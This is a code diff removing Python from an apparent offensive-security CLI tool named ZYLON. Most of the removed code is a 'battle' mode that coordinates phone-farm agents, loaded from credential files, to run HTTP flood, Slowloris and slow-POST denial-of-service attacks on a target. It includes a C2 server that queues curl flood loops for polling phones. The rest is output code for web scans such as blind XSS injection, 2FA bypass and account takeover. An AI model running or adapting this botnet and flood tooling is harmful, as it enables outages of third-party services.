-            console.print("[bold red][!] No agents. Use 'add' then 'connect'[/bold red]")
-            return
-        
-        if not self.battle.target:
-            console.print("[bold red][!] No target set. Use 'target' first[/bold red]")
-            return
-        
-        active = sum(1 for a in self.battle.agents if a.connected)
-        if active == 0:
-            console.print("[bold red][!] No agents connected. Use 'connect' first[/bold red]")
-            return
-        
-        if self.battle.stats['start_time'] is None:
-            self.battle.stats['start_time'] = time.time()
-        
-        console.print(f"\n[bold red]⚔️  LAUNCHING {phase.upper()} | {active} agents → {self.battle.target}[/bold red]")
-        console.print("[dim]   Press Ctrl+C for EMERGENCY STOP[/dim]")
-        
-        try:
-            if phase == 'recon':
-                self.battle.phase_recon(self.battle.target)
-            elif phase == 'flood':
-                reqs = IntPrompt.ask("[bold yellow]   Requests per agent[/bold yellow]", default=50)
-                path = Prompt.ask("[bold yellow]   URL path[/bold yellow]", default="/")
-                self.battle.phase_flood(self.battle.target, requests_per_agent=reqs, path=path)
-            elif phase == 'slowloris':
-                conns = IntPrompt.ask("[bold yellow]   Connections per agent[/bold yellow]", default=3)
-                from urllib.parse import urlparse as _up
-                p = _up(self.battle.target)
-                host = p.hostname
-                port = p.port or 80
-                self.battle.phase_slowloris(host, target_port=port, connections_per_agent=conns)
-            elif phase == 'slowpost':
-                conns = IntPrompt.ask("[bold yellow]   Connections per agent[/bold yellow]", default=2)
-                self.battle.phase_slow_post(self.battle.target, connections_per_agent=conns)
-        except KeyboardInterrupt:
-            self._battle_emergency_stop()
-        
-        self.battle.display_dashboard()
-    
-    def _battle_full(self):
-        """Run full battle - all phases"""
-        if not self.battle.agents or not self.battle.target:
-            console.print("[bold red][!] Need agents + target. Use 'add', 'connect', 'target'[/bold red]")
-            return
-        
-        active = sum(1 for a in self.battle.agents if a.connected)
-        if active == 0:
-            console.print("[bold red][!] No agents connected. Use 'connect'[/bold red]")
-            return
-        
-        self.battle.stats['start_time'] = time.time()
-        
-        console.print(f"\n[bold red]")
-        console.print(Panel(
-            f"[bold white]   FULL BATTLE COMMENCING[/bold white]\n"
-            f"[bold red]   {active} agents → {self.battle.target}[/bold red]\n"
-            f"[bold yellow]   4 Phases | Ctrl+C = EMERGENCY STOP[/bold yellow]",
-            border_style="bold red",
-            box=box.HEAVY
-        ))
-        
-        from urllib.parse import urlparse as _up
-        p = _up(self.battle.target)
-        host = p.hostname
-        port = p.port or 80
-        
-        phases = [
-            ('recon', lambda: self.battle.phase_recon(self.battle.target)),
-            ('flood', lambda: self.battle.phase_flood(self.battle.target, requests_per_agent=50)),
-            ('slowloris', lambda: self.battle.phase_slowloris(host, target_port=port)),
-            ('slowpost', lambda: self.battle.phase_slow_post(self.battle.target)),
-        ]
-        
-        for phase_name, phase_func in phases:
-            try:
-                phase_func()
-            except KeyboardInterrupt:
-                self._battle_emergency_stop()
-                console.print("[bold red][!] EMERGENCY STOP - All agents halted[/bold red]")
-                break
-        
-        # Final dashboard
-        self.battle.display_dashboard()
-        
-        # Defense tips
-        console.print(f"\n[bold cyan]🛡️ Blue Team Defense Tips:[/bold cyan]")
-        console.print(f"  [cyan]- Apache: Set Timeout 30, MaxRequestWorkers 150[/cyan]")
-        console.print(f"  [cyan]- Nginx: limit_req_zone rate=10r/s, limit_conn per IP[/cyan]")
-        console.print(f"  [cyan]- Deploy WAF with rate limiting (ModSecurity)[/cyan]")
-        console.print(f"  [cyan]- Use CDN (Cloudflare) for DDoS absorption[/cyan]")
-        console.print(f"  [cyan]- Implement JS Challenge for suspicious traffic[/cyan]")
-    
-    def _battle_load_file(self):
-        """Load agents from a creds file (for 4K+ phone farms)"""
-        console.print("\n[bold cyan][*] Load Agents from File[/bold cyan]")
-        console.print("[dim]   Format: IP:PORT:USER:PASS (one per line)[/dim]")
-        console.print("[dim]   Shortcut: IP:PORT or just IP[/dim]")
-        
-        filepath = Prompt.ask("[bold yellow]   File path[/bold yellow]")
-        success, msg = self.battle.load_file(filepath)
-        if success:
-            console.print(f"[green][+] {msg}[/green]")
-        else:
-            console.print(f"[bold red][!] {msg}[/bold red]")
-    
-    def _battle_probe(self):
-        """Probe a phone to diagnose connection issues"""
-        console.print("\n[bold cyan][*] Probe Agent - Diagnose Connection[/bold cyan]")
-        
-        host = Prompt.ask("[bold yellow]   Phone IP[/bold yellow]")
-        results = self.battle.probe_agent(host)
-        
-        # Show port scan results
-        probe_table = Table(title=f"Probe Results: {host}", box=box.ROUNDED, border_style="cyan")
-        probe_table.add_column("Port", style="yellow")
-        probe_table.add_column("Status", style="white")
-        probe_table.add_column("Detail", style="cyan")
-        
-        for port, info in results['ports'].items():
-            status = "[green]OPEN[/green]" if info['open'] else "[red]CLOSED[/red]"
-            probe_table.add_row(str(port), status, info['detail'])
-        
-        console.print(probe_table)
-        
-        if results['recommendation']:
-            console.print(f"\n[bold yellow]Recommendation:[/bold yellow] {results['recommendation']}")
-    
-    def _battle_c2_mode(self):
-        """HTTP C2 mode - for phones behind NAT/carrier firewall"""
-        from core.http_c2 import HTTPC2Server
-        
-        console.print("\n[bold cyan][*] HTTP C2 Mode - Phones Behind NAT/Cellular[/bold cyan]")
-        console.print(Panel(
-            "[bold white]   HTTP C2 ARCHITECTURE[/bold white]\n"
-            "[bold yellow]   Phones connect OUT to your server[/bold yellow]\n"
-            "[dim white]   Works through carrier NAT, any firewall[/dim white]\n\n"
-            "[bold]HOW IT WORKS:[/bold]\n"
-            "1. ZYLON starts an HTTP server on YOUR phone\n"
-            "2. Farm phones run a tiny bash script (curl-based)\n"
-            "3. Phones poll for commands every 3 seconds\n"
-            "4. ZYLON queues curl commands for all phones\n"
-            "5. Phones execute and report results\n\n"
-            "[bold green]NO TELNET/SSH NEEDED![/bold green]\n"
-            "[bold green]NO PYTHON NEEDED ON FARM PHONES![/bold green]\n"
-            "[bold green]JUST CURL (already in Termux)![/bold green]",
-            border_style="bold cyan",
-            box=box.HEAVY
-        ))
-        
-        port = IntPrompt.ask("[bold yellow]   C2 Server Port[/bold yellow]", default=9999)
-        
-        c2 = HTTPC2Server(port=port)
-        success, msg = c2.start()
-        
-        if success:
-            console.print(f"[green][+] {msg}[/green]")
-            
-            # Generate agent script
-            server_url = f"http://YOUR_PHONE_IP:{port}"
-            script = c2.get_agent_script(server_url)
-            script_path = os.path.join(os.path.dirname(__file__), 'zylon_agent.sh')
-            try:
-                with open(script_path, 'w') as f:
-                    f.write(script)
-                console.print(f"[green][+] Agent script saved: zylon_agent.sh[/green]")
-            except Exception:
-                console.print("[yellow][!] Could not save agent script[/yellow]")
-            
-            console.print(f"\n[bold yellow]NEXT STEPS:[/bold yellow]")
-            console.print(f"  1. Find YOUR phone IP: ifconfig")
-            console.print(f"  2. Edit zylon_agent.sh: change YOUR_PHONE_IP to your actual IP")
-            console.print(f"  3. Copy zylon_agent.sh to each farm phone")
-            console.print(f"  4. On each phone: chmod +x zylon_agent.sh && ./zylon_agent.sh")
-            console.print(f"  5. Come back here and use 'target' + 'flood' commands")
-            
-            # Set target if already set
-            if self.battle.target:
-                c2.target = self.battle.target
-                console.print(f"\n[cyan][*] Target already set: {self.battle.target}[/cyan]")
-            
-            # C2 interactive loop
-            console.print(f"\n[bold cyan]C2 Server running. Type commands below:[/bold cyan]")
-            while True:
-                console.print(f"\n[bold magenta]C2[/bold magenta] [bold yellow]>[/bold yellow] ", end="")
-                try:
-                    c2_cmd = input().strip().lower()
-                except (KeyboardInterrupt, EOFError):
-                    c2.stop()
-                    break
-                
-                if c2_cmd in ['exit', 'quit', 'q', 'back']:
-                    c2.stop()
-                    console.print("[yellow][*] C2 Server stopped[/yellow]")
-                    break
-                elif c2_cmd == 'phones':
-                    console.print(f"[cyan]Phones online: {c2.get_phone_count()}[/cyan]")
-                    for pid, status in c2.phone_status.items():
-                        console.print(f"  {pid}: last seen {status.get('last_seen', '?')}")
-                elif c2_cmd == 'target':
-                    target = Prompt.ask("[bold yellow]   Target URL[/bold yellow]")
-                    c2.target = target
-                    self.battle.target = target
-                    console.print(f"[green][+] Target set: {target}[/green]")
-                elif c2_cmd == 'flood':
-                    if not c2.target:
-                        console.print("[red][!] Set target first: target[/red]")
-                        continue
-                    count = IntPrompt.ask("[bold yellow]   Requests per phone[/bold yellow]", default=50)
-                    cmd = (
-                        f"for i in $(seq 1 {count}); do "
-                        f"curl -s -o /dev/null -w '%{{http_code}} ' "
-                        f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
-                        f"'{c2.target}?q=$RANDOM' --max-time 5 2>/dev/null; "
-                        f"done; echo ''"
-                    )
-                    n = c2.queue_command(cmd)
-                    console.print(f"[green][+] Flood command queued for {n} phones[/green]")
-                elif c2_cmd == 'recon':
-                    if not c2.target:
-                        console.print("[red][!] Set target first: target[/red]")
-                        continue
-                    cmd = (
-                        f"for i in $(seq 1 5); do "
-                        f"curl -s -o /dev/null -w '%{{http_code}} ' "
-                        f"-H 'User-Agent: ZYLONAcademy-RedTeam' "
-                        f"'{c2.target}?zylon=$RANDOM' --max-time 5 2>/dev/null; "
-                        f"sleep 0.5; done; echo ''"
-                    )
-                    n = c2.queue_command(cmd)
-                    console.print(f"[green][+] Recon command queued for {n} phones[/green]")
-                elif c2_cmd == 'stop':
-                    c2.queue_command("echo STOP")
-                    console.print("[yellow][+] Stop signal sent to all phones[/yellow]")
-                elif c2_cmd == 'script':
-                    console.print("\n[bold cyan]Agent Script (copy to each phone):[/bold cyan]")
-                    console.print(c2.get_agent_script(f"http://YOUR_PHONE_IP:{port}"))
-                elif c2_cmd == 'help':
-                    console.print(Panel(
-                        "[bold]C2 Commands:[/bold]\n"
-                        "  phones  - Show connected phones\n"
-                        "  target  - Set target URL\n"
-                        "  recon   - Light probe (5 reqs/phone)\n"
-                        "  flood   - HTTP flood (50 reqs/phone)\n"
-                        "  stop    - Stop all phones\n"
-                        "  script  - Show agent script\n"
-                        "  help    - Show this help\n"
-                        "  exit    - Stop C2 server",
-                        border_style="cyan"
-                    ))
-                else:
-                    console.print("[yellow]Unknown command. Type 'help'[/yellow]")
-        else:
-            console.print(f"[bold red][!] {msg}[/bold red]")
-    
-    def _battle_emergency_stop(self):
-        """Emergency stop all agents"""
-        if self.battle.agents:
-            console.print(f"\n[bold red][!!!] EMERGENCY STOP - Stopping all agents...[/bold red]")
-            self.battle.disconnect_all()
-            console.print("[bold green][+] All agents stopped and disconnected[/bold green]")
-
-    # ========================================================================
-    # V3.0 SECURITY MODULE SCAN IMPLEMENTATIONS (56-75)
-    # ========================================================================
-
-    def _scan_graphql(self):
-        """Scan 56: GraphQL Security Tester"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] GraphQL Security Scan on {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Testing GraphQL endpoints...[/bold magenta]"):
-            result = self.v3_security.scan_graphql(url)
-        self.results['findings']['graphql'] = result
-        if result.get('graphql_found'):
-            console.print(f"[bold yellow][*] GraphQL endpoint found![/bold yellow]")
-            for ep in result.get('endpoints', []):
-                console.print(f"  [cyan]Endpoint: {ep}[/cyan]")
-            for f in result.get('findings', []):
-                sev = f.get('severity', 'Info')
-                color = 'red' if sev in ['Critical', 'High'] else 'yellow' if sev == 'Medium' else 'cyan'
-                console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-                console.print(f"      {f.get('note', '')}")
-        else:
-            console.print("[green][+] No GraphQL endpoints detected[/green]")
-
-    def _scan_dom_xss(self):
-        """Scan 57: DOM-based XSS Scanner"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] DOM XSS Scan on {self.target}[/bold red]")
-        with console.status("[bold magenta]Analyzing JavaScript for DOM XSS patterns...[/bold magenta]"):
-            result = self.v3_security.scan_dom_xss(url)
-        self.results['findings']['dom_xss'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] DOM XSS Vulnerability Detected![/bold red]")
-            for f in result.get('findings', []):
-                sev = f.get('severity', 'Medium')
-                color = 'red' if sev in ['Critical', 'High'] else 'yellow'
-                console.print(f"  [{color}]*[/{color}] {f['type']}: {f.get('pattern', '')} ({sev})")
-                if f.get('js_file'):
-                    console.print(f"      JS: {f['js_file'][:80]}")
-        else:
-            console.print(f"[green][+] No DOM XSS detected ({result.get('tested', 0)} JS files analyzed)[/green]")
-
-    def _scan_reverse_ip(self):
-        """Scan 58: Reverse IP Lookup"""
-        console.print(f"\n[bold cyan][*] Reverse IP Lookup for {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Finding domains on same IP...[/bold magenta]"):
-            result = self.v3_security.reverse_ip_lookup(self.target)
-        self.results['findings']['reverse_ip'] = result
-        if result.get('ip'):
-            console.print(f"  [cyan]IP: {result['ip']}[/cyan]")
-        if result.get('domains'):
-            console.print(f"  [green]Found {result['total']} domains on same IP:[/green]")
-            for domain in result['domains'][:20]:
-                console.print(f"    - {domain}")
-            if result['total'] > 20:
-                console.print(f"    ... and {result['total'] - 20} more")
-        else:
-            console.print("[yellow][!] No co-hosted domains found[/yellow]")
-
-    def _scan_dns_zone_transfer(self):
-        """Scan 59: DNS Zone Transfer Test"""
-        console.print(f"\n[bold red][*] DNS Zone Transfer Test on {self.target}[/bold red]")
-        with console.status("[bold magenta]Testing AXFR on nameservers...[/bold magenta]"):
-            result = self.v3_security.test_dns_zone_transfer(self.target)
-        self.results['findings']['dns_zone_transfer'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!!!] DNS ZONE TRANSFER VULNERABLE![/bold red]")
-            console.print(f"  [red]Dumped {result.get('total_records', 0)} DNS records![/red]")
-            for rec in result.get('records', [])[:15]:
-                console.print(f"    {rec.get('name', '')} [{rec.get('type', '')}] -> {str(rec.get('value', ''))[:60]}")
-        else:
-            console.print(f"[green][+] Zone transfer properly denied ({result.get('tested', 0)} nameservers tested)[/green]")
-            for ns in result.get('nameservers', []):
-                console.print(f"    NS: {ns}")
-
-    def _scan_cache_deception(self):
-        """Scan 60: Web Cache Deception"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Web Cache Deception Test on {self.target}[/bold red]")
-        with console.status("[bold magenta]Testing cache deception variations...[/bold magenta]"):
-            result = self.v3_security.scan_cache_deception(url)
-        self.results['findings']['cache_deception'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] Web Cache Deception Detected![/bold red]")
-            for f in result.get('findings', []):
-                console.print(f"  [red]*[/red] {f['type']}: {f.get('test_url', '')[:80]}")
-                console.print(f"      Similarity: {f.get('similarity', '')} | Severity: {f.get('severity', '')}")
-        else:
-            console.print(f"[green][+] No cache deception detected ({result.get('tested', 0)} tests)[/green]")
-
-    def _scan_clickjacking(self):
-        """Scan 61: Clickjacking Detector"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] Clickjacking Test on {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Testing framing protections...[/bold magenta]"):
-            result = self.v3_security.scan_clickjacking(url)
-        self.results['findings']['clickjacking'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] Clickjacking Vulnerability Detected![/bold red]")
-            for f in result.get('findings', []):
-                if 'PoC' in f.get('type', ''):
-                    console.print(f"  [yellow]*[/yellow] {f['type']} - save as HTML and test")
-                else:
-                    console.print(f"  [red]*[/red] {f['type']} - {f.get('note', '')}")
-        else:
-            console.print("[green][+] Clickjacking properly protected[/green]")
-
-    def _scan_csp(self):
-        """Scan 62: CSP Analyzer"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] CSP Analysis on {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Analyzing Content-Security-Policy...[/bold magenta]"):
-            result = self.v3_security.analyze_csp(url)
-        self.results['findings']['csp'] = result
-        if result.get('findings'):
-            console.print("[bold yellow][*] CSP Issues Found:[/bold yellow]")
-            for f in result.get('findings', []):
-                sev = f.get('severity', 'Medium')
-                color = 'red' if sev in ['Critical', 'High'] else 'yellow' if sev == 'Medium' else 'cyan'
-                console.print(f"  [{color}]*[/{color}] {f['type']} - {f.get('note', '')}")
-        else:
-            console.print("[green][+] CSP is properly configured[/green]")
-
-    def _scan_account_takeover(self):
-        """Scan 63: Account Takeover Suite"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Account Takeover Test on {self.target}[/bold red]")
-        with console.status("[bold magenta]Testing ATO vectors...[/bold magenta]"):
-            result = self.v3_security.scan_account_takeover(url)
-        self.results['findings']['account_takeover'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] Account Takeover Vector Detected![/bold red]")
-        for f in result.get('findings', []):
-            sev = f.get('severity', 'Medium')
-            color = 'red' if sev in ['Critical', 'High'] else 'yellow'
-            console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-            console.print(f"      {f.get('note', '')}")
-
-    def _scan_oauth(self):
-        """Scan 64: OAuth/SSO Misconfig Scanner"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] OAuth/SSO Misconfig Scan on {self.target}[/bold red]")
-        with console.status("[bold magenta]Testing OAuth implementations...[/bold magenta]"):
-            result = self.v3_security.scan_oauth_misconfig(url)
-        self.results['findings']['oauth'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] OAuth Misconfiguration Detected![/bold red]")
-        for f in result.get('findings', []):
-            sev = f.get('severity', 'Info')
-            color = 'red' if sev in ['Critical', 'High'] else 'yellow' if sev == 'Medium' else 'cyan'
-            console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-            console.print(f"      {f.get('note', '')}")
-
-    def _scan_http_method(self):
-        """Scan 65: HTTP Method Tampering"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] HTTP Method Tampering Test on {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Testing HTTP methods...[/bold magenta]"):
-            result = self.v3_security.scan_http_method_tampering(url)
-        self.results['findings']['http_method'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] HTTP Method Tampering Detected![/bold red]")
-        for f in result.get('findings', []):
-            sev = f.get('severity', 'Info')
-            color = 'red' if sev in ['Critical', 'High'] else 'yellow' if sev == 'Medium' else 'cyan'
-            console.print(f"  [{color}]*[/{color}] {f['type']}")
-            if f.get('method'):
-                console.print(f"      Method: {f.get('method', '')} | Status: {f.get('status', '')}")
-            if f.get('note'):
-                console.print(f"      {f['note']}")
-        if not result.get('vulnerable') and not result.get('findings'):
-            console.print(f"[green][+] No HTTP method tampering detected ({result.get('tested', 0)} tested)[/green]")
-
-    def _scan_shodan_internetdb(self):
-        """Scan 66: Shodan InternetDB Lookup"""
-        console.print(f"\n[bold cyan][*] Shodan InternetDB Lookup for {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Querying Shodan InternetDB...[/bold magenta]"):
-            result = self.v3_security.lookup_shodan_internetdb(self.target)
-        self.results['findings']['shodan_internetdb'] = result
-        if result.get('error'):
-            console.print(f"[red][!] {result['error']}[/red]")
-        else:
-            if result.get('ip'):
-                console.print(f"  [cyan]IP: {result['ip']}[/cyan]")
-            if result.get('ports'):
-                console.print(f"  [yellow]Open Ports: {', '.join(str(p) for p in result['ports'])}[/yellow]")
-            if result.get('vulns'):
-                console.print(f"  [red]Known Vulnerabilities ({len(result['vulns'])}):[/red]")
-                for v in result['vulns'][:10]:
-                    console.print(f"    - {v}")
-            if result.get('hostnames'):
-                console.print(f"  [cyan]Hostnames: {', '.join(result['hostnames'][:5])}[/cyan]")
-            if result.get('cpes'):
-                console.print(f"  [yellow]Software: {', '.join(result['cpes'][:5])}[/yellow]")
-
-    def _scan_favicon_hash(self):
-        """Scan 67: Favicon Hash Discovery"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] Favicon Hash Discovery for {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Calculating favicon hash...[/bold magenta]"):
-            result = self.v3_security.discover_favicon_hash(url)
-        self.results['findings']['favicon_hash'] = result
-        if result.get('hash'):
-            console.print(f"  [cyan]Hash: {result['hash']} ({result.get('hash_type', '')})[/cyan]")
-            console.print(f"  [cyan]MD5: {result.get('md5', 'N/A')}[/cyan]")
-            if result.get('favicon_url'):
-                console.print(f"  [cyan]Favicon URL: {result['favicon_url']}[/cyan]")
-            if result.get('related_domains'):
-                console.print(f"  [yellow]Related Domains ({len(result['related_domains'])}):[/yellow]")
-                for d in result['related_domains'][:10]:
-                    console.print(f"    - {d}")
-        else:
-            console.print(f"[yellow][!] {result.get('error', 'Could not calculate favicon hash')}[/yellow]")
-
-    def _scan_pastebin_dork(self):
-        """Scan 68: Pastebin Dorking"""
-        console.print(f"\n[bold cyan][*] Pastebin Dorking for {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Searching for leaked data...[/bold magenta]"):
-            result = self.v3_security.dork_pastebin(self.target)
-        self.results['findings']['pastebin_dork'] = result
-        if result.get('findings'):
-            console.print(f"[bold red][!] Found {result['total']} leaked entries![/bold red]")
-            for f in result.get('findings', []):
-                console.print(f"  [red]*[/red] {f.get('url', '')}")
-                if f.get('sensitive_types'):
-                    console.print(f"      Sensitive: {', '.join(f['sensitive_types'])} | Severity: {f.get('severity', '')}")
-        else:
-            console.print(f"[green][+] No leaked data found on paste sites[/green]")
-        for source, count in result.get('sources', {}).items():
-            console.print(f"  [cyan]Source {source}: {count} results[/cyan]")
-
-    def _scan_url_shortener(self):
-        """Scan 69: URL Shortener Discovery"""
-        console.print(f"\n[bold cyan][*] URL Shortener Discovery for {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Finding shortened URLs...[/bold magenta]"):
-            result = self.v3_security.discover_url_shorteners(self.target)
-        self.results['findings']['url_shortener'] = result
-        if result.get('expanded_urls'):
-            console.print(f"  [green]Found {result['total_expanded']} shortened URLs pointing to target:[/green]")
-            for item in result['expanded_urls'][:10]:
-                console.print(f"    {item['short']} -> {item['expanded']}")
-        if result.get('hidden_paths'):
-            console.print(f"  [yellow]Hidden Paths Discovered ({len(result['hidden_paths'])}):[/yellow]")
-            for path in result['hidden_paths'][:10]:
-                console.print(f"    {path}")
-        if not result.get('expanded_urls'):
-            console.print("[green][+] No shortened URLs found[/green]")
-
-    def _scan_security_robots(self):
-        """Scan 70: Security.txt & Robots.txt & Sitemap Parser"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] Security.txt / Robots.txt / Sitemap for {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Parsing security files...[/bold magenta]"):
-            result = self.v3_security.parse_security_robots_sitemap(url)
-        self.results['findings']['security_robots'] = result
-        # Security.txt
-        if result.get('security_txt', {}).get('found'):
-            console.print(f"  [green]security.txt: Found[/green]")
-            for key in ['Contact', 'Expires', 'Preferred-Languages', 'Canonical']:
-                if result['security_txt'].get(key):
-                    console.print(f"    {key}: {result['security_txt'][key]}")
-        else:
-            console.print(f"  [yellow]security.txt: Not found[/yellow]")
-        # Robots.txt
-        if result.get('robots_txt', {}).get('found'):
-            disallowed = result['robots_txt'].get('disallowed', [])
-            console.print(f"  [green]robots.txt: Found ({len(disallowed)} disallowed paths)[/green]")
-            for path in disallowed[:10]:
-                console.print(f"    Disallow: {path}")
-        else:
-            console.print(f"  [yellow]robots.txt: Not found[/yellow]")
-        # Sitemap
-        if result.get('sitemap', {}).get('found'):
-            total = result['sitemap'].get('total', 0)
-            console.print(f"  [green]sitemap.xml: Found ({total} URLs)[/green]")
-        else:
-            console.print(f"  [yellow]sitemap.xml: Not found[/yellow]")
-        # Findings
-        for f in result.get('findings', []):
-            console.print(f"  [yellow]*[/yellow] {f['type']} - {f.get('note', '')}")
-
-    def _scan_blind_xss(self):
-        """Scan 71: Blind XSS Scanner"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Blind XSS Scan on {self.target}[/bold red]")
-        with console.status("[bold magenta]Injecting blind XSS payloads...[/bold magenta]"):
-            result = self.v3_security.scan_blind_xss(url)
-        self.results['findings']['blind_xss'] = result
-        if result.get('findings'):
-            console.print(f"[bold yellow][*] Blind XSS Payloads Submitted ({result.get('tested', 0)} tests)[/bold yellow]")
-            for f in result.get('findings', []):
-                sev = f.get('severity', 'Medium')
-                color = 'red' if sev == 'High' else 'yellow'
-                console.print(f"  [{color}]*[/{color}] {f['type']} ({f.get('method', '')} to {f.get('url', '')[:60]})")
-                console.print(f"      {f.get('note', '')}")
-        else:
-            console.print(f"[green][+] No forms found for blind XSS injection[/green]")
-
-    def _scan_websocket(self):
-        """Scan 72: WebSocket Security Tester"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] WebSocket Security Test on {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Testing WebSocket endpoints...[/bold magenta]"):
-            result = self.v3_security.scan_websocket(url)
-        self.results['findings']['websocket'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] WebSocket Vulnerability Detected![/bold red]")
-        for f in result.get('findings', []):
-            sev = f.get('severity', 'Info')
-            color = 'red' if sev in ['Critical', 'High'] else 'yellow' if sev == 'Medium' else 'cyan'
-            console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-            console.print(f"      {f.get('note', '')}")
-
-    def _scan_2fa_bypass(self):
-        """Scan 73: 2FA Bypass Tester"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] 2FA Bypass Test on {self.target}[/bold red]")
-        with console.status("[bold magenta]Testing 2FA bypass vectors...[/bold magenta]"):
-            result = self.v3_security.scan_2fa_bypass(url)
-        self.results['findings']['2fa_bypass'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] 2FA Bypass Possible![/bold red]")
-        for f in result.get('findings', []):
-            sev = f.get('severity', 'Info')
-            color = 'red' if sev in ['Critical', 'High'] else 'yellow' if sev == 'Medium' else 'cyan'
-            console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-            console.print(f"      {f.get('note', '')}")
-
-    def _scan_mixed_content(self):
-        """Scan 74: Mixed Content Scanner"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] Mixed Content Scan on {self.target}[/bold cyan]")
-        with console.status("[bold magenta]Checking for mixed content...[/bold magenta]"):
-            result = self.v3_security.scan_mixed_content(url)
-        self.results['findings']['mixed_content'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] Mixed Content Detected![/bold red]")
-            for f in result.get('active', []):
-                console.print(f"  [red]*[/red] Active: {f.get('tag', '')} -> {f.get('url', '')[:60]}")
-            for f in result.get('passive', []):
-                console.print(f"  [yellow]*[/yellow] Passive: {f.get('tag', '')} -> {f.get('url', '')[:60]}")
-        else:
-            total = result.get('total_passive', 0) + result.get('total_active', 0)
-            console.print(f"[green][+] No mixed content issues ({total} found)[/green]")
-
-    def _scan_info_disclosure(self):
-        """Scan 75: Information Disclosure Hunter"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold red][*] Information Disclosure Scan on {self.target}[/bold red]")
-        with console.status("[bold magenta]Hunting for information disclosure...[/bold magenta]"):
-            result = self.v3_security.scan_info_disclosure(url)
-        self.results['findings']['info_disclosure'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] Information Disclosure Detected![/bold red]")
-        for f in result.get('findings', []):
-            sev = f.get('severity', 'Medium')
-            color = 'red' if sev in ['Critical', 'High'] else 'yellow' if sev == 'Medium' else 'cyan'
-            console.print(f"  [{color}]*[/{color}] {f['type']} - Severity: {sev}")
-            if f.get('url'):
-                console.print(f"      URL: {f['url'][:80]}")
-            if f.get('header'):
-                console.print(f"      {f['header']}: {f.get('value', '')}")
-            if f.get('note'):
-                console.print(f"      {f['note']}")
-        if not result.get('vulnerable') and not result.get('findings'):
-            console.print(f"[green][+] No information disclosure detected ({result.get('tested', 0)} tests)[/green]")
-
-    # ========================================================================
-    # V4.0 HUNTING MODULE SCAN IMPLEMENTATIONS (76-83)
-    # ========================================================================
-
-    def _scan_username_enum(self):
-        """Scan 76: Username Enumeration Scanner"""
-        url = f"{self.protocol}{self.target}"
-        console.print(f"\n[bold cyan][*] Username Enumeration Scan on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Testing for username enumeration vulnerabilities...[/bold cyan]"):
-            result = self.v4_hunting.scan_username_enum(url)
-        self.results['findings']['username_enum'] = result
-        if result.get('vulnerable'):
-            console.print("[bold red][!] Username Enumeration Detected![/bold red]")
-            e_table = Table(title="Confirmed Valid Usernames", box=box.HEAVY, border_style="red")
-            e_table.add_column("Username", style="red")
-            e_table.add_column("Evidence", style="yellow")
-            for finding in result.get('findings', []):
-                e_table.add_row(
-                    finding.get('username', ''),
-                    finding.get('evidence', '')[:60]
-                )
-            console.print(e_table)
-        else:
-            console.print(f"[green][+] No username enumeration detected ({result.get('tested', 0)} usernames tested)[/green]")
-
-    def _scan_email_security(self):
-        """Scan 77: DMARC/DKIM/SPF Email Security Checker"""
-        console.print(f"\n[bold cyan][*] Email Security (DMARC/DKIM/SPF) Check on {self.target}[/bold cyan]")
-        with console.status("[bold cyan]Checking email security records...[/bold cyan]"):
-            result = self.v4_hunting.scan_email_security(self.target)
-        self.results['findings']['email_security'] = result
-
-        # Display DMARC
-        dmarc = result.get('dmarc', {})
-        dmarc_status = dmarc.get('status', 'unknown')
-        console.print(f"\n[bold]DMARC:[/bold] {'[red]MISSING[/red]' if dmarc_status == 'missing' else '[green]' + dmarc_status + '[/green]'}")
-        if dmarc.get('policy'):
-            console.print(f"  Policy: {dmarc['policy']}")
-
-        # Display SPF
-        spf = result.get('spf', {})
-        spf_status = spf.get('status', 'unknown')
-        console.print(f"[bold]SPF:[/bold] {'[red]MISSING[/red]' if spf_status == 'missing' else '[green]' + spf_status + '[/green]'}")
-        if spf.get('all_mechanism'):
